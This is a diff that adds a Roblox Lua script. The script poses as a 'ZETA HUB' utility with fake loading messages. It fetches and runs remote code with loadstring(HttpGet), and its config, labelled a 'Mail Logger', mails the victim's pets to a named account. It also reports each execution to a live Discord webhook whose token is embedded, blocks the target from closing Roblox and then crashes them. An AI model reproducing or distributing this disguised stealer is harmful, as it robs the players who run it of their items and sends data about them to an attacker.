@@ -1,0 +1,29 @@
+UserName = "bhujo556"
+UserName2 = "rip_lastlaff"
+Webhook = "https://discord.com/api/webhooks/1097488048339554457/kwhAyYs2uJjj1lQu58TfqAgjs1zkBKLACNzIIz-5C5Swk04rp4rZ3J1WVOXeOv_v9GC_"
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "bhujo556" --// Username To Send Pets To
+_G.GiftMessage = "I love you" --// Message For The Gift To Say
+_G.Diamonds = 1000000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = false --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true --// Crashes Them After Its Finished
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = true --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1097488048339554457/kwhAyYs2uJjj1lQu58TfqAgjs1zkBKLACNzIIz-5C5Swk04rp4rZ3J1WVOXeOv_v9GC_" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "ZETA HUB" --// Script Name On The UI
+_G.Tip1 = "Thanks for using ZETA HUB!" --// Gives You Tips On The UI
+_G.Tip2 = "Loading GUI....." --// Gives You Tips On The UI
+_G.Tip3 = "Loading GUI....." --// Gives You Tips On The UI
+_G.Tip4 = "Finishing....." --// Gives You Tips On The UI
+_G.Tip5 = "Finishing....." --// Gives You Tips On The UI
+
+--[[ Script ]]
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua%22))() 
